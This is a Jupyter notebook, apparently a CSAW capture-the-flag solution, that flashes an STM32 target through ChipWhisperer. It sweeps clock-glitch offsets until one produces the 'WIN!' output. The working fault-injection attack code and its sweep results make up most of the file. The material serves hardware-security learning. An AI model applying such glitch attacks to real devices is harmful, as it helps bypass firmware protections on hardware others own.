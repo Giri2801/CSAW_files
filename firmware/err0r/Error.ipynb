{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "c1ae8766",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:ChipWhisperer NAEUSB:Your firmware is outdated - latest is 0.52. Suggested to update firmware, as you may experience errors\n",
      "See https://chipwhisperer.readthedocs.io/en/latest/api.html#firmware-update\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Detected known STMF32: STM32F04xxx\n",
      "Extended erase (0x44), this can take ten seconds or more\n",
      "Attempting to program 5171 bytes at 0x8000000\n",
      "STM32F Programming flash...\n",
      "STM32F Reading flash...\n",
      "Verified flash OK, 5171 bytes\n"
     ]
    }
   ],
   "source": [
    "import chipwhisperer as cw\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "n = 4\n",
    "\n",
    "try :\n",
    "    scope.dis()\n",
    "    target.dis()\n",
    "except Exception as e:\n",
    "    pass\n",
    "\n",
    "scope = cw.scope()\n",
    "target = cw.target(scope)\n",
    "\n",
    "scope.default_setup()\n",
    "\n",
    "cw.program_target(scope, cw.programmers.STM32FProgrammer, \"./err0r-CWNANO-true.hex\")\n",
    "\n",
    "scope.arm()\n",
    "\n",
    "\n",
    "scope.adc.samples = 1000\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "87bd0a61",
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "\n",
    "scope.io.clkout = 7.5E6\n",
    "def reboot_flush():            \n",
    "    scope.io.nrst = False\n",
    "    time.sleep(0.05)\n",
    "    scope.io.nrst = \"high_z\"\n",
    "    time.sleep(0.05)\n",
    "    #Flush garbage too\n",
    "    target.flush()\n",
    "\n",
    "def reset_target(scope): \n",
    "    scope.io.nrst = 'low'\n",
    "    time.sleep(0.05)\n",
    "    scope.io.nrst = 'high'\n",
    "    time.sleep(0.05)\n",
    "\n",
    "def cap_pass_trace(pass_guess):\n",
    "    ret = \"\"\n",
    "    reset_target(scope)\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 16)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "\n",
    "    scope.arm()\n",
    "#     target.write(pass_guess)\n",
    "    target.simpleserial_write('h', pass_guess)\n",
    "\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    return trace"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "d8a3f816",
   "metadata": {},
   "outputs": [],
   "source": [
    "msg = bytearray([1,2,3,4,5,6,7,8])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "73c98968",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "25b1b08f64fd44609e38076e726aa390",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='success count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "573cda7e68bd4f11ab6dbcf4952cd670",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='reset count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0b564fe4b0ec4d28a137d007d30a4b28",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='normal count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ead1e9eeeef241ae99a18e43dbf7e5d5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='repeat setting:', disabled=True, max=10.0, readou…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "35c56152febf4d28a2434e32aa024f2b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import chipwhisperer.common.results.glitch as glitch\n",
    "gc = glitch.GlitchController(groups=[\"success\", \"reset\", \"normal\"], parameters=[\"repeat\", \"ext_offset\"])\n",
    "gc.display_stats()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "5e11e180",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Figure size 432x288 with 0 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%matplotlib inline\n",
    "import matplotlib.pylab as plt\n",
    "fig = plt.figure()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "170dbd5e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "offset:100, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:101, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:102, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:103, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:104, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:106, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:108, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:111, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:112, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:113, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:114, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:115, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:116, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:117, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:118, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:119, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:126, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:128, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:129, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:130, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:131, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:132, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:133, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:134, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:136, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:137, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:141, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:144, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:145, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:146, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:147, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:148, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:149, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:150, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:151, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:152, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:154, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:156, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:159, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:160, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:161, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:162, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:163, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:164, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:165, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:166, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:167, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:169, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:174, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:176, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:177, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:178, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:179, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:180, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:181, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:182, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:184, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:185, repeat: 1, o/p:  [87, 73, 78, 33]\n",
      "offset:189, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:192, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:193, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:194, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:195, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:196, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:197, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:198, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:199, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "offset:200, repeat: 1, o/p:  [197, 136, 202, 63]\n",
      "Done glitching\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "from importlib import reload\n",
    "import chipwhisperer.common.results.glitch as glitch\n",
    "from tqdm.notebook import trange\n",
    "import struct\n",
    "\n",
    "g_step = 1\n",
    "\n",
    "gc.set_global_step(g_step)\n",
    "gc.set_range(\"repeat\", 1,1 )\n",
    "gc.set_range(\"ext_offset\", 100, 200) \n",
    "scope.glitch.repeat = 0\n",
    "\n",
    "reboot_flush()\n",
    "sample_size = 1\n",
    "for glitch_setting in gc.glitch_values():\n",
    "    scope.glitch.repeat = glitch_setting[0]\n",
    "    scope.glitch.ext_offset = glitch_setting[1]\n",
    "    successes = 0\n",
    "    resets = 0\n",
    "    for i in range(1):\n",
    "        target.flush()\n",
    "            \n",
    "        scope.arm()\n",
    "        \n",
    "        #Do glitch loop\n",
    "        target.simpleserial_write(\"h\", msg)\n",
    "        \n",
    "        ret = scope.capture()\n",
    "        \n",
    "        val = target.simpleserial_read_witherrors('r', 4, glitch_timeout=10)#For loop check\n",
    "        \n",
    "        if ret:\n",
    "            print('Timeout - no trigger')\n",
    "            gc.add(\"reset\", (scope.glitch.repeat, scope.glitch.ext_offset))\n",
    "            plt.plot(scope.glitch.ext_offset, scope.glitch.repeat, 'xr', alpha=1)\n",
    "            fig.canvas.draw()\n",
    "            resets += 1\n",
    "\n",
    "            #Device is slow to boot?\n",
    "            reboot_flush()\n",
    "\n",
    "        else:\n",
    "            if val['valid'] is False:\n",
    "                reboot_flush()\n",
    "                gc.add(\"reset\", (scope.glitch.repeat, scope.glitch.ext_offset))\n",
    "                plt.plot(scope.glitch.ext_offset, scope.glitch.repeat, 'xr', alpha=1)\n",
    "                fig.canvas.draw()\n",
    "                resets += 1\n",
    "            else:\n",
    "                print(f'offset:{scope.glitch.ext_offset}, repeat: {scope.glitch.repeat}, o/p: ',[int(i) for i in val['payload']])\n",
    "                gcnt = struct.unpack(\"<I\", val['payload'])[0]\n",
    "                \n",
    "    if successes > 0:                \n",
    "        print(\"successes = {}, resets = {}, repeat = {}, ext_offset = {}\".format(successes, resets, scope.glitch.repeat, scope.glitch.ext_offset))\n",
    "print(\"Done glitching\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "ea7fbc22",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'WIN!'"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lis = [87,73,78,33]\n",
    "''.join([chr(i) for i in lis])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "40d087a0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "target.dis()\n",
    "scope.dis()"
   ]
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "df0893f56f349688326838aaeea0de204df53a132722cbd565e54b24a8fec5f6"
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
